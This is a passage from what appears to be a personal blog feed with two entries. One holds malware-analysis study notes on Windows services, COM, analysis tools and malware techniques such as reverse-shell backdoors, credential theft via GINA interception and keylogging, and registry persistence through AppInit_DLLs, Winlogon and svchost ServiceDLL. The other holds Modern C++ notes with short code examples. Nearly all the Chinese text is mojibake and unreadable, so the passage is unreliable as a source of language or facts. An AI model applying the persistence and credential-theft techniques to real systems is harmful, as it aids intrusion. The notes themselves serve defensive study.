</p></li><li><p>æœåŠ¡</p><ul><li>Windowsæ“ä½œç³»ç»Ÿæ”¯æŒå¤šç§æœåŠ¡ç±»å‹ï¼Œå®ƒä»¬ä»¥ç‹¬ç‰¹çš„æ–¹å¼æ‰§è¡Œã€‚æ¶æ„ä»£ç æœ€å¸¸ä½¿ç”¨çš„æ˜¯wIN32_SHARE_PROCESsç±»å‹ï¼Œè¿™ç§ç±»å‹å°†è¿™ä¸ªæœåŠ¡çš„ä»£ç ä¿å­˜åœ¨ä¸€ä¸ªDLLä¸­ï¼Œå¹¶ä¸”åœ¨ä¸€ä¸ªå…±äº«çš„è¿›ç¨‹ä¸­ç»„åˆå¤šä¸ªä¸åŒçš„æœåŠ¡ã€‚åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåä¸º<code>svchost.exe</code>è¿›ç¨‹çš„å¤šä¸ªå®ä¾‹ï¼Œå®ƒä»¬åœ¨è¿è¡ŒWIN32_SHARE_PROCESSç±»å‹çš„æœåŠ¡ã€‚</li><li>WIN32_OWN_PROCESsç±»å‹æœ‰æ—¶ä¹Ÿè¢«ä½¿ç”¨ï¼Œå› ä¸ºå®ƒåœ¨ä¸€ä¸ª.exeæ–‡ä»¶ä¸­ä¿å­˜ä»£ç ï¼Œè€Œä¸”ä½œä¸ºä¸€ä¸ªç‹¬ç«‹è¿›ç¨‹è¿è¡Œã€‚</li><li>æœ€åä¸€ä¸ªå¸¸è§çš„æœåŠ¡ç±»å‹æ˜¯KERNEL_DRIVERï¼Œå®ƒè¢«ç”¨æ¥åŠ è½½ä»£ç åˆ°å†…æ ¸ä¸­æ‰§è¡Œã€‚(æˆ‘ä»¬åœ¨æœ¬ç« åé¢ä»¥åŠç¬¬10ç« å°†æ‰©å±•åœ°è®¨è®ºè¿è¡Œåœ¨å†…æ ¸ä¸­çš„æ¶æ„ä»£ç ã€‚)</li><li>scå’Œqcå‘½ä»¤. </li></ul></li><li><p>ç»„ä»¶å¯¹è±¡æ¨¡å‹ <a href="https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal">COM</a> </p><ul><li>ä¸è¡Œæ–‡æ¡£å¤ªå¤šäº†çœ‹ä¸å®Œ, æœ‰ç©ºå†è¯´. </li><li>p175</li><li>COMè¢«å®ç°æˆ ä¸€ä¸ªå®¢æˆ·æœåŠ¡å™¨æ¡†æ¶ ã€‚ å®¢æˆ·ç«¯æ˜¯é‚£äº›ä½¿ç”¨ COMå¯¹è±¡ çš„ ç¨‹åº ï¼ŒæœåŠ¡å™¨æ˜¯é‚£äº›å¯å¤ç”¨çš„è½¯ä»¶ç»„ä»¶ä¸€ä¹Ÿå°±æ˜¯COMå¯¹è±¡æœ¬èº« ã€‚ å¾®è½¯æä¾›äº†å¾ˆå¤šCOMå¯¹è±¡ç»™ç¨‹åºä½¿ç”¨ ã€‚</li><li>COMå¯¹è±¡é€šè¿‡å®ƒä»¬ çš„å…¨å±€å”¯ä¸€ æ ‡è¯†ç¬¦( GUID ) ï¼Œåˆ†ä¸ºç±»å‹æ ‡è¯†ç¬¦ ( CLSID ) ä»¥åŠæ¥å£æ ‡è¯†ç¬¦( CIID ) ,æ¥è¿›è¡Œè®¿é—® </li><li>CoCreateinstance å‡½æ•°è¢«ç”¨æ¥è·å–å¯¹ COM åŠŸèƒ½çš„è®¿é—® ã€‚ æ¶æ„ä»£ç ä½¿ç”¨çš„ ä¸€ ä¸ªå¸¸ç”¨å‡½æ•°æ˜¯Navigate , å®ƒå…è®¸ ä¸€ ä¸ªç¨‹åºå¯åŠ¨ Internet Explorer , å¹¶è®¿é—® ä¸€ ä¸ª Web åœ° å€ ã€‚ Navigate å‡½æ•°æ˜¯IWebBrowser2 ç»„ä»¶æ¥å£çš„ ä¸€éƒ¨åˆ†ï¼Œè¿™ä¸ªæ¥å£æŒ‡å®šäº† ä¸€ä¸ªå¿…é¡»è¢«å®ç°çš„å‡½æ•°åˆ—è¡¨ï¼Œä½†æ˜¯å®ƒæ²¡æœ‰æŒ‡å®šå“ªä¸ªç¨‹åºä¼šæä¾›è¿™ ä¸ªåŠŸèƒ½ã€‚æä¾›è¿™ä¸ªåŠŸèƒ½çš„ç¨‹åºå°±æ˜¯å®ç°äº† IWebBrowser2 æ¥å£çš„COMç±» ã€‚ åœ¨å¤šæ•°ä¾‹å­ä¸­ ï¼Œ IWebBrowser2 æ¥ å£ è¢«Internet Explorerå®ç° ã€‚ æ¥å£é€šè¿‡ä¸€ä¸ª å« åšlID çš„GUIDæ¥æ ‡è¯† ï¼Œè€ŒCOMç±»é€šè¿‡ä¸€ä¸ªå«åšCLSID çš„GUIDæ¥æ ‡è¯†ã€‚</li></ul></li><li><p>å¼‚å¸¸</p><ul><li>â€¦.</li></ul></li><li><p>åŸç”ŸAPI</p><img src="../../image/Malware_Analysis/image-20221215212228116.png" alt="image-20221215212228116" style="zoom:80%;" /><ul><li><code>Ntdll.dll</code>å³ä¸ºåŸç”ŸAPIæ¥å£å¯¼å‡ºdll. </li></ul></li></ul><h1 id="åŠ¨æ€åˆ†æ"><a href="#åŠ¨æ€åˆ†æ" class="headerlink" title="åŠ¨æ€åˆ†æ"></a>åŠ¨æ€åˆ†æ</h1><ul><li>æ²™ç®±<ul><li>æ²™ç®±ä¸èƒ½å‘Šè¯‰ä½ æ¶æ„ä»£ç åšäº†ä»€ä¹ˆã€‚å®ƒèƒ½æŠ¥å‘ŠåŸºæœ¬åŠŸèƒ½ï¼Œä½†æ˜¯å®ƒä¸èƒ½å‘Šè¯‰ä½ æ¶æ„ä»£ç æ˜¯ ä¸€ ä¸ªå®šåˆ¶çš„ S AMå¯†æ–‡è®°å½•å™¨ï¼Œæˆ–æ˜¯ä¸€ä¸ªåŠ å¯†çš„é”®ç›˜è®°å½•å é—¨ ç¨‹åºã€‚è¿™äº›ç»“è®ºéœ€è¦ä½ è‡ªå·±æ€»ç»“ã€‚</li><li>ä¸€äº›æ¶æ„ä»£ç éœ€è¦ç³»ç»Ÿä¸Šæ‹¥æœ‰ç‰¹å®šçš„æ³¨å†Œè¡¨é¡¹æˆ–è€…æ–‡ä»¶æ‰ä¼šæ‰§è¡Œï¼Œè€Œè¿™äº›åœ¨æ²™ç®±å†…æ˜¯æ‰¾ä¸åˆ°çš„ã€‚è¿™äº›å°±å¯èƒ½éœ€è¦åŒ…å«ä¸€äº›åˆæ³•æ•°æ®ï¼Œæ¯”å¦‚æ§åˆ¶å‘½ä»¤æˆ–è€…åŠ å¯†å¯†é’¥ã€‚</li></ul></li><li><code>rundl132.exe DLLname, Export arguments </code> </li><li>RegMon(æ£€æµ‹æ³¨å†Œè¡¨è¡Œä¸º) RegShot ProcessMonitor(è¿™ä¸œè¥¿æ˜¯è¡Œä¸ºç›‘æµ‹) ProcessExplorer(è¿™ä¸œè¥¿æ˜¯è¿›ç¨‹æµè§ˆ) dependency walker<ul><li>è¿›ç¨‹æµè§ˆå™¨ä¸€ä¸ªç‰¹åˆ«æœ‰ç”¨çš„åŠŸèƒ½å°±æ˜¯é•œåƒæ ‡ç­¾é‡Œçš„éªŒè¯ ( Verify ) æŒ‰é’®ã€‚å•å‡»æ­¤æŒ‰é’®ï¼Œå¯ä»¥éªŒè¯ç£ç›˜ä¸Šçš„é•œåƒæ–‡ä»¶æ˜¯å¦å…·æœ‰å¾®è½¯çš„ç­¾åè®¤è¯ ã€‚ éªŒè¯æŒ‰é’®éªŒè¯çš„æ˜¯ç£ç›˜ä¸Šçš„é•œåƒæ–‡ä»¶ï¼Œè€Œä¸æ˜¯å†…å­˜ä¸­çš„ï¼Œå›  æ­¤å®ƒå¯èƒ½ä¼šå¤±æ•ˆï¼Œå¦‚æœä¸€ä¸ªæ”»å‡»è€…ä½¿ç”¨è¿›ç¨‹æ›¿æ¢æŠ€æœ¯process replacement, é‚£è¿™ä¸ªä¸œè¥¿å°±æ²¡ç”¨äº†. </li></ul></li><li>æ¨¡æ‹Ÿç½‘ç»œ:  è¿™äº›èµ„æºå¯ä»¥åŒ…æ‹¬DNS åŸŸåç³»ç»Ÿã€ IP åœ°å€å’Œæ•°æ®åŒ…è®°å½•å™¨ã€‚<ul><li>Apate DNS</li><li>NetCat, ncå‘½ä»¤</li><li>Wireshark, dddd</li><li>INetSim, internet simulation</li></ul></li><li>è°ƒè¯•<ul><li>æ ‡å¿—å¯„å­˜å™¨ä¸­çš„é™·é˜±æ ‡å¿— (trap fl ag) ç”¨åƒå•æ­¥è°ƒè¯• ã€‚ é™·é˜±æ ‡å¿—ç½®ä½åï¼Œå¤„ç†å™¨æ¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤å°±ä¼šäº§ç”Ÿå¼‚å¸¸ ã€‚</li></ul></li><li>Ollydbg &amp;&amp; WinDbg<ul><li>æš‚ä¸”ä¸æ€¥, è¿™ä¸¤ä¸ªç†Ÿç»ƒä½¿ç”¨æ˜¯ä¸ªå¤§å‘</li></ul></li></ul><h1 id="æ¶æ„ä»£ç åŠŸèƒ½"><a href="#æ¶æ„ä»£ç åŠŸèƒ½" class="headerlink" title="æ¶æ„ä»£ç åŠŸèƒ½"></a>æ¶æ„ä»£ç åŠŸèƒ½</h1><h4 id="æ¶æ„ä»£ç å¯èƒ½è¡Œä¸º"><a href="#æ¶æ„ä»£ç å¯èƒ½è¡Œä¸º" class="headerlink" title="æ¶æ„ä»£ç å¯èƒ½è¡Œä¸º"></a>æ¶æ„ä»£ç å¯èƒ½è¡Œä¸º</h4><ul><li>ä¸‹è½½å™¨å’Œå¯åŠ¨å™¨</li><li>åé—¨: åå¼¹shell è¿œç¨‹æ§åˆ¶ åƒµå°¸ç½‘ç»œ</li><li>ç™»å½•å‡­è¯çªƒå¬: æ²¡çœ‹æ‡‚<ul><li>GINAæ‹¦æˆª: åœ¨æ³¨å†Œè¡¨é‡Œå†™å…¥dllæ¡ç›®, å®ç°ä¼ªé€ çš„ç™»å½•è®¤è¯è¿‡ç¨‹. </li><li>å£ä»¤å“ˆå¸Œè½¬å‚¨: DLLæ³¨å…¥. </li><li>å‡»é”®è®°å½•: é’©å­æˆ–è€…è½®è¯¢(ç”¨æˆ·æ€)</li></ul></li><li>å­˜æ´»æœºåˆ¶: ä¸€ æ—¦æ¶æ„ä»£ç è·å–ç³»ç»Ÿçš„æ§åˆ¶æƒï¼Œå®ƒé€šå¸¸å°±ä¼šåœ¨ç³»ç»Ÿä¸­é©»ç•™å¾ˆé•¿ä¸€æ®µæ—¶é—´ ï¼Œ æ¶æ„ä»£ç çš„è¿™ç§è¡Œä¸ºè¢«ç§°ä¸ºå­˜æ´» ã€‚ å¦‚æœå­˜æ´»æœºåˆ¶è¶³å¤Ÿç‰¹åˆ«ï¼Œå®ƒç”šè‡³èƒ½ä½œä¸ºç»™å®šæ¶æ„ä»£ç çš„æŒ‡çº¹ã€‚<ul><li>é€šå¸¸å­˜åœ¨äº<strong>æ³¨å†Œè¡¨</strong>ä¸­.  ä¸€äº›å—æ¬¢è¿çš„æ³¨å†Œè¡¨é¡¹ä»å€¼å¾—å»æ·±å…¥æ‰©å±•ï¼š <code>Appinit_DLL</code> ã€ <code>Winlogon</code> å’Œ <code>SvcHostDLL</code> ã€‚svchost. exe æ˜¯ä»åŠ¨æ€é“¾æ¥åº“ä¸­è¿è¡ŒæœåŠ¡çš„é€šç”¨ä¸»æœºè¿›ç¨‹ ï¼Œ Windowsæ“ä½œç³»ç»Ÿé€šå¸¸åŒä¸€æ—¶åˆ»è¿è¡Œå¤šä¸ªsvchost.exe å®ä¾‹ã€‚æ¯ä¸ªå®ä¾‹åŒ…å«ä¸€ ç»„æœåŠ¡. </li><li><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\svsvc </code>ä¸‹æ˜¯schostæœåŠ¡çš„æ³¨å†Œè¡¨é¡¹, æ‰€æœ‰çš„svchost.exe DLLåŒ…å«æ‹¥æœ‰ServiceDLL å€¼çš„ Parameters é”® ï¼Œè¿™ æ˜¯æ¶æ„ä»£ç ç¼–å†™è€…è®¾ç½®æ¶æ„DLLç¨‹åºçš„ä½ç½®, Parameters é”®ä¸‹å¦ ä¸€ä¸ªå€¼Start ç”¨æ¥ç¡®å®šæœåŠ¡ä½•æ—¶å¯åŠ¨ï¼ˆæ¶æ„ä»£ç é€šå¸¸è®¾ç½®ä¸ºç³»ç»Ÿå¼•å¯¼æ—¶å¯åŠ¨)ã€‚</li><li><strong>ç‰¹æ´›ä¼Šæœ¨é©¬åŒ–ç³»ç»ŸäºŒè¿›åˆ¶æ–‡ä»¶</strong>: åˆ©ç”¨è¿™ç§æŠ€æœ¯ï¼Œæ¶æ„ä»£ç èƒ½å¤Ÿä¿®æ”¹ç³»ç»Ÿçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå½“è¢«æ„ŸæŸ“çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸‹æ¬¡è¿è¡Œæˆ–è€…åŠ è½½æ—¶ï¼Œå°†ä¼šå¼ºåˆ¶è¿è¡Œæ¶æ„ä»£ç  ã€‚ </li><li><strong>DLL åŠ è½½é¡ºåºåŠ«æŒ</strong>: </li></ul></li><li>ææƒ</li><li>rootkit : éšè—æ¶æ„ä»£ç è¡Œä¸ºçš„å·¥å…·<ul><li>ä¸¤ç§ç”¨æˆ·æ€rootkit: IATå’Œ inline Hook</li><li>â€¦</li></ul></li><li></li></ul>]]></content>
    
    
    <categories>
      
      <category>practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>practice</tag>
      
      <tag>malware</tag>
      
      <tag>reverse engineering</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CXX Correlative</title>
    <link href="/2022-12/Now-CXX-Correlative/"/>
    <url>/2022-12/Now-CXX-Correlative/</url>
    
    <content type="html"><![CDATA[<p><a href="https://changkun.de/modern-cpp/en-us/02-usability/">Online Book</a> </p><h1 id="Modern-CXX"><a href="#Modern-CXX" class="headerlink" title="Modern CXX"></a>Modern CXX</h1><h2 id="Language-U3sability-Enhancements"><a href="#Language-U3sability-Enhancements" class="headerlink" title="Language U3sability Enhancements"></a>Language U3sability Enhancements</h2><h3 id="2-1-Constants"><a href="#2-1-Constants" class="headerlink" title="2.1 Constants"></a>2.1 Constants</h3><h4 id="nullptr"><a href="#nullptr" class="headerlink" title="nullptr"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#nullptr">nullptr</a></h4><ul><li>no implicit conversion from <code>void*</code> to other types | conflict with C++ overloading</li><li>so replace NULL with nullptr. </li></ul><h4 id="constexpr"><a href="#constexpr" class="headerlink" title="constexpr"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#constexpr">constexpr</a></h4><ul><li>same declaration position as <code>const</code>, introduced in C++11. </li><li>modern compilers will do most of optimizations, such as <code>alloca()</code>, so this is not a problem to use variable in declarations. </li><li>C++11 provides <code>constexpr</code> to let the user <strong>explicitly declare</strong> that the function or object constructor will become a constant expression at compile time. </li><li>Starting with C++14, the constexpr <strong><u>function</u></strong> <strong>can use simple statements</strong> such as local variables, loops, and branches internally. But in C++11 only return statement is allowed.</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fibonacci</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> n == <span class="hljs-number">1</span> || n == <span class="hljs-number">2</span> ? <span class="hljs-number">1</span> : <span class="hljs-built_in">fibonacci</span>(n<span class="hljs-number">-1</span>) + <span class="hljs-built_in">fibonacci</span>(n<span class="hljs-number">-2</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-Variables-and-initialization"><a href="#2-2-Variables-and-initialization" class="headerlink" title="2.2 Variables and initialization"></a>2.2 Variables and initialization</h3><h4 id="if-switch"><a href="#if-switch" class="headerlink" title="if-switch"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#if-switch">if-switch</a></h4><ul><li>define temporary variable in <code>if</code> statement like <code>for</code>. </li></ul><h4 id="Initializer-list"><a href="#Initializer-list" class="headerlink" title="Initializer list"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Initializer-list">Initializer list</a></h4><ul><li>Different initialization methods are specific to each other and <strong>cannot be generic</strong>.</li><li>C++11 first binds the <strong>concept of the initialization list</strong> to the <strong><u>type</u></strong> and calls it <code>std::initializer_list</code>.<br>Just a language formation -&gt; a specific type can be used as var.</li><li>new form: <code>Foo foo2 &#123;3, 4&#125;;</code> </li></ul><h4 id="Structured-binding"><a href="#Structured-binding" class="headerlink" title="Structured binding"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Structured-binding">Structured binding</a></h4><ul><li><code>auto [x, y, z] = f();</code>  where <code>f()</code> returns a tuple. No need to use <code>std::tie()</code> </li></ul><h3 id="2-3-Type-inference"><a href="#2-3-Type-inference" class="headerlink" title="2.3 Type inference"></a>2.3 Type inference</h3><h4 id="auto-needless-to-say"><a href="#auto-needless-to-say" class="headerlink" title="auto : needless to say."></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#auto">auto</a> : <del>needless to say</del>.</h4><ul><li>Since C++ 20, <code>auto</code> can even be used as <strong>function arguments</strong>.</li></ul><h4 id="decltype"><a href="#decltype" class="headerlink" title="decltype :"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#decltype">decltype</a> :</h4><p>Its usage is very similar to <code>typeof</code> | <code>std::is_same&lt;T, U&gt;</code> </p><h4 id="tail-type-inference"><a href="#tail-type-inference" class="headerlink" title="tail type inference :"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#tail-type-inference">tail type inference</a> :</h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//cpp 11+</span><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-keyword">typename</span> U&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add2</span><span class="hljs-params">(T x, U y)</span> -&gt; <span class="hljs-title">decltype</span><span class="hljs-params">(x+y)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><span class="hljs-comment">//cpp 14+</span><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-keyword">typename</span> U&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add3</span><span class="hljs-params">(T x, U y)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> x + y;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="decltype-auto"><a href="#decltype-auto" class="headerlink" title="decltype(auto) :"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#decltype-auto">decltype(auto)</a> :</h4><p>a slightly more complicated use of C++14. used to derive the return type of a forwarding function or package</p><h3 id="2-4-Control-flow"><a href="#2-4-Control-flow" class="headerlink" title="2.4 Control flow"></a>2.4 Control flow</h3><ul><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#if-constexpr">if constexpr</a> : C++17 <code>if constexpr (std::is_integral&lt;T&gt;::value) &#123;</code> put branch judgement in compile time. </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Range-based-for-loop">Range-based for loop</a> : <code>for (auto element : vec)</code> </li></ul><h3 id="2-5-Templates"><a href="#2-5-Templates" class="headerlink" title="2.5 Templates"></a>2.5 Templates</h3><ul><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Extern-templates">Extern templates</a> :  C++11 tell the compiler not to trigger the instantiation of the template.<br>  <code>extern template class std::vector&lt;double&gt;; // should not instantiation in current file</code> </p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#The-quot-gt-quot">The â€œ&gt;â€</a> : ä¹Ÿå°±æ˜¯<code>&gt;&gt;</code>çš„ç¼–è¯‘é—®é¢˜</p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Type-alias-templates">Type alias templates</a> : C++11 typedef now can define a new name for template(the following <code>vector&lt;T&gt;</code>)<br>  <code>using TrueDarkMagic = MagicType&lt;std::vector&lt;T&gt;, std::string&gt;;</code> </p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Variadic-templates">Variadic templates</a> :  C++11 å’Œ if constexpé…å¥—ä½¿ç”¨. è¿˜æœ‰ä¸€äº›ç»†èŠ‚ç‚¹å‡»é“¾æ¥. </p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Fold-expression">Fold expression</a> : ?</p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Non-type-template-parameter-deduction">Non-type template parameter deduction</a> : </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//after cpp 11</span><br><span class="hljs-keyword">buffer_t</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-number">100</span>&gt; buf; <span class="hljs-comment">// 100 as template parameter, `template &lt;class T, int BufSize&gt;`</span><br><span class="hljs-comment">//after cpp 17</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">auto</span> value&gt; <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span> </span>&#123;<br>    std::cout &lt;&lt; value &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">int</span> tmp = foo&lt;<span class="hljs-number">10</span>&gt;();<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="2-6-Object-oriented"><a href="#2-6-Object-oriented" class="headerlink" title="2.6 Object-oriented"></a>2.6 Object-oriented</h3><ul><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Delegate-constructor">å§”æ‰˜æ„é€ Delegate constructor</a> : allows a constructor to call another constructor in a constructor in the same class. </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Inheritance-constructor">Inheritance constructor</a> : ç»§æ‰¿æ„é€  C++11 æ€ç»´å¯¼å›¾å·²ç»è®°è¿‡äº†. </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Explicit-virtual-function-overwrite">Explicit virtual function overwrite</a> : â€¦.</li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#override">override</a> : self-evident </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#final">final</a> : canâ€™t be override and derived</li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Explicit-delete-default-function">Explicit delete default function</a> : </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Strongly-typed-enumerations">Strongly typed enumerations</a> : <code>enum class [enum_name] : typeÂ &#123; ... &#125;;</code> </li></ul><h2 id="Chapter-03-Language-Runtime-Enhancements"><a href="#Chapter-03-Language-Runtime-Enhancements" class="headerlink" title="Chapter 03: Language Runtime Enhancements"></a>Chapter 03: Language Runtime Enhancements</h2><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#3-1-Lambda-Expression">3.1 Lambda Expression</a> </p><ul><li><ul><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Basics">Basics</a> : C++14 expr capture?</li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Generic-Lambda">Generic Lambda</a> : C++14 use auto in parameter list. </li></ul></li></ul><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#3-2-Function-Object-Wrapper">3.2 Function Object Wrapper</a> </p><ul><li><ul><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#std-function">std::function</a> : </li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#std-bind-and-std-placeholder">std::bind and std::placeholder</a> : </li></ul></li></ul><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#3-3-rvalue-Reference">3.3 rvalue Reference</a></p><ul><li><ul><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#lvalue-rvalue-prvalue-xvalue">lvalue, rvalue, prvalue, xvalue</a> <ul><li>pure rvalueå°±æ˜¯ä¼ ç»Ÿcppçš„å³å€¼, è€Œå°†äº¡å€¼(expire value)æ˜¯æŒ‡å‡½æ•°è¿”å›å€¼é‚£æ ·çš„ä¸œè¥¿, C++11ä¹‹åä¼šä½¿ç”¨ä¸€ä¸ªæ•ˆæœç­‰åŒäºéšå¼è½¬æ¢çš„æ“ä½œæ¥å°†è¿”å›å€¼å˜æˆä¸€ä¸ªå³å€¼. å®é™…ä¸Šé€šè¿‡åç¼–è¯‘å¯ä»¥çœ‹å‡ºå‡½æ•°<strong>å¤šä¼ å…¥äº†ä¸Šçº§æ ˆå¸§çš„ä¸€ä¸ªä¸´æ—¶å˜é‡</strong>ä½œä¸ºè¿”å›å€¼çš„æ¥æ”¶è€…, raxé€»è¾‘ä¸Šæ²¡æœ‰å­˜ä»»ä½•ä¸œè¥¿. å¦‚æœåœ¨æ–°å˜é‡å®šä¹‰é˜¶æ®µæ¥æ”¶è¿™æ ·çš„è¿”å›å€¼, é‚£ä¹ˆè¿™ä¸ªæ–°å˜é‡å°±æ˜¯ä¸Šé¢çš„ä¸´æ—¶å˜é‡. </li></ul></li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#rvalue-reference-and-lvalue-reference">rvalue reference and lvalue reference</a> : æœ‰äº›ç»†èŠ‚, ä¸è¿‡ä¸å†™ä»£ç ä¹Ÿæ²¡å¿…è¦çŸ¥é“. </li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Move-semantics">Move semantics</a> : <ul><li>è¯´çš„èŠ±é‡Œèƒ¡å“¨, ä»€ä¹ˆå»¶é•¿äº†ç”Ÿå­˜å‘¨æœŸ, å…¶å®å°±æ˜¯å¤šäº†ä¸ªå‚æ•°. åªè¦è®°ä½: <strong>å°†äº¡å€¼æ˜¯ä¸€ä¸ªå³å€¼</strong> </li><li><code>v.push_back(std::move(str));</code> è¿™ä¸€å¥å®Œå…¨ä¸çŸ¥é“å“ªé‡Œæ¸…ç©ºçš„str, åç¼–è¯‘æ²¡çœ‹æ˜ç™½. è®°ç€é€»è¾‘ä¸Šæ¸…ç©ºäº†å°±å®Œäº†. </li></ul></li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Perfect-forwarding">Perfect forwarding</a> : <a href="https://stackoverflow.com/questions/8526598#answer-8527373">https://stackoverflow.com/questions/8526598#answer-8527373</a><ul><li>å³å€¼å¼•ç”¨çš„å˜é‡æœ¬èº«æ˜¯å·¦å€¼</li><li>å¯¹äºå·¦å³å€¼å¼•ç”¨<strong>çš„å¼•ç”¨</strong>æ¥è¯´é€‚ç”¨äºreference collapse. ä¹‹å‰æ˜¯ä¸å…è®¸è¿™æ ·çš„æ“ä½œçš„. </li><li>åœ¨æ¨¡æ¿å‡½æ•°å‚æ•°ä¸­ä½¿ç”¨å³å€¼å¼•ç”¨, ç„¶å<ul><li>å½“ä¼ å…¥å·¦å€¼æ—¶æ¨¡æ¿å‚æ•°è‡ªåŠ¨æ¨å¯¼æˆå·¦å€¼å¼•ç”¨, ä½¿ç”¨ä¸Šé¢çš„è§„åˆ™å¾—åˆ°å³å€¼å¼•ç”¨çš„å·¦å€¼å¼•ç”¨ä¸ºå·¦å€¼å¼•ç”¨. è¿™ä¸ªå˜é‡ç¡®å®ä¹Ÿæ˜¯å·¦å€¼, forwardå…¶å®æ— ä½œç”¨</li><li>ä¼ å…¥å³å€¼æ—¶è¿˜æ˜¯å³å€¼å¼•ç”¨, ä½†æ˜¯å˜é‡æœ¬èº«æ˜¯å·¦å€¼, éœ€è¦forwardæˆå³å€¼ä¿æŒä¸å˜. </li></ul></li><li>æ‰€ä»¥ä½¿ç”¨å³å€¼å¼•ç”¨åšå‡½æ•°å‚æ•°, åŠ ä¸Šä¸ªforwardå°±è§£å†³äº†ä¸¤ç§æƒ…å†µ. </li></ul></li></ul></li></ul><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Conclusion">Conclusion</a></p><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Further-Readings">Further Readings</a> </p><h2 id="çœ‹äº†åŠå¤©éƒ½å†™ä¸å…¨-è¿˜æ˜¯cppreferenceå§"><a href="#çœ‹äº†åŠå¤©éƒ½å†™ä¸å…¨-è¿˜æ˜¯cppreferenceå§" class="headerlink" title="çœ‹äº†åŠå¤©éƒ½å†™ä¸å…¨, è¿˜æ˜¯cppreferenceå§"></a>çœ‹äº†åŠå¤©éƒ½å†™ä¸å…¨, è¿˜æ˜¯cppreferenceå§</h2><p><a href="https://en.cppreference.com/w/cpp/11">C++ 11çš„å…¨éƒ¨æ–°ç‰¹æ€§</a>, <a href="https://en.cppreference.com/w/cpp/14">Cpp14</a>, <a href="https://en.cppreference.com/w/cpp/17">Cpp17</a>, <a 